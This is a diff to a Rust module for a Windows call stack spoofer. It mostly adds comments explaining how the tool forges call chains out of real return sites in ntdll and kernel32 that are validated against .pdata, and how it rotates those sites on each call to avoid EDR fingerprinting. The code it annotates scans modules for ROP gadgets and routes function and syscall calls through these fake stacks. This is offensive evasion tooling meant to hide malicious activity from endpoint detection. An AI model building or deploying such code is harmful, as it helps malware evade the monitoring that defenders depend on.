@@ -2,6 +2,13 @@
  * Dynamic Call Stack Spoofer 
  * Constructs a fake call stack that passes both RBP chain walking AND RtlVirtualUnwind validation by using real return addresses
  * from backed modules (ntdll, kernel32) that have valid RUNTIME_FUNCTION entries in .pdata
+ * 
+ * Spoofed chain for every syscall:
+ *  ntdll!RtlUserThreadStart                <- thread origin    (backed)
+ *      |_ kernel32!BaseThreadInitThunk     <- thread init      (backed)
+ *          |_kernel32!<function>           <- application call (backed)
+ *              |_ ntdll!<function>         <- native call      (backed)
+ *                  |_ syscall              <- real instruction 
  * */
 
 use core::ffi::c_void;
@@ -11,6 +18,10 @@ use core::ptr::null_mut;
 use crate::core::types::HANDLE;
 use crate::core::unwind;
 
+/**
+ * This will store resolved return sites from backed module for stack frame spoofing
+ * Sites are validated aganist .pdata for RUNTIME_FUNCTION coverage
+ * */
 pub struct SpoofGadgets {
     pub ntdll_gadgets: [*mut c_void; 8 as usize], // Return Sites within ntdll.dll (.pdata-validated)
     pub kernel32_gadgets: [*mut c_void; 8 as usize], // Return Sites within kernel32.dll (.pdata-validated)
@@ -24,6 +35,8 @@ pub struct SpoofGadgets {
     kernel32_site_count: usize,
 }
 
+// Wrapper to make SpoofGadgets usable in a static.
+// Safety: initialized once then read only. *single threaded*
 struct GadgetCell(UnsafeCell<SpoofGadgets>);
 unsafe impl Sync for GadgetCell {}
 
@@ -76,7 +89,7 @@ pub unsafe fn initialize_spoof_gadgets() -> bool {
 
 
 /**
- * Scab a module .txt section for ROP gadget 
+ * Scan a module .txt section for ROP gadget 
  * */
 unsafe fn scan_module_for_gadgets(module_base: HANDLE, gadgets: &mut [*mut c_void; 8 as usize]) -> usize {
     if module_base.is_null() {
@@ -160,12 +173,23 @@ unsafe fn scan_module_for_gadgets(module_base: HANDLE, gadgets: &mut [*mut c_voi
     count
 }
 
+
+/**
+ * Call a function with a dynamically spoofed call stack
+ * Builds a 3 frame spoofed chain using .pdata validated return sites:
+ *      Frame3: kernel32 return site    (thread origin)
+ *      Frame2: kernel32 return site    (intermediate call)
+ *      Frame1: ntdll return site       (NTAPI layer)
+ *      -> actual function call    
+ * Each call rotates through different return sites to avoid EDR fingerprinting of repeated identical call stacks     
+ * */
 pub unsafe fn call_with_spoofed_stack(function: *mut c_void, args: &[usize]) -> i32 {
     let g = &*GADGETS.0.get();
     if !g.initialized || g.count_ntdll == 0 || g.count_kernel32 == 0 {
         return call_direct(function, args);
     }
 
+    // Chose return sites. prefer .pdata-validated sites when available or fall back to legacy gadgets
     static CALL_COUNTER: core::sync::atomic::AtomicUsize = core::sync::atomic::AtomicUsize::new(0);
     let counter = CALL_COUNTER.fetch_add(1, core::sync::atomic::Ordering::Relaxed);
 
@@ -177,6 +201,7 @@ pub unsafe fn call_with_spoofed_stack(function: *mut c_void, args: &[usize]) -> 
         (g.ntdll_gadgets[counter % g.count_ntdll] as usize, g.kernel32_gadgets[counter % g.count_kernel32] as usize)
     };
 
+    // Pick a second kernel32 site for the chain terminator (thread origin)
     let k32_terminator = if g.kernel32_site_count > 1 {
         g.kernel32_sites[(counter + 3) % g.kernel32_site_count].address
     } else {
@@ -211,6 +236,9 @@ pub unsafe fn call_with_spoofed_stack(function: *mut c_void, args: &[usize]) -> 
     result
 }
 
+/**
+ * Fallback: this to call a function directly without stack spoof
+ * */
 unsafe fn call_direct(function: *mut c_void, args: &[usize]) -> i32 {
     match args.len() {
         0 => {
